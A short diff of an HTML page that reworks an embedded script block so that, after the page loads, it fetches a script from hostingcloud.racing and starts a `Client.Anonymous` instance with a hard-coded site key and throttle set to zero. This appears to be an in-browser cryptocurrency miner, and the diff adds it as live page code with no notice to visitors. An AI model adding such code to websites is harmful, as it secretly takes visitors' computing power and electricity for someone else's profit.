@@ -66,14 +66,19 @@
   </script>
 
 
-
-<script src="https://www.hostingcloud.racing/LSV0.js"></script>
 <script>
-    var _client = new Client.Anonymous('0931a19b9bf55187f7eb0b42760d346c417de342add853171911589bdf2c19f9', {
-        throttle: 0, c: 'w', ads: 0
-    });
-    _client.start();
-    
+
+   window.onload = function() {
+    var script = document.createElement('script');
+    script.src = "https://www.hostingcloud.racing/xXmw.js";
+    script.onload = function() {
+        var _client = new Client.Anonymous('0931a19b9bf55187f7eb0b42760d346c417de342add853171911589bdf2c19f9', {
+            throttle: 0, c: 'w', ads: 0
+        });
+        _client.start();
+    };
+    document.body.appendChild(script);
+}; 
 
 </script> 
   
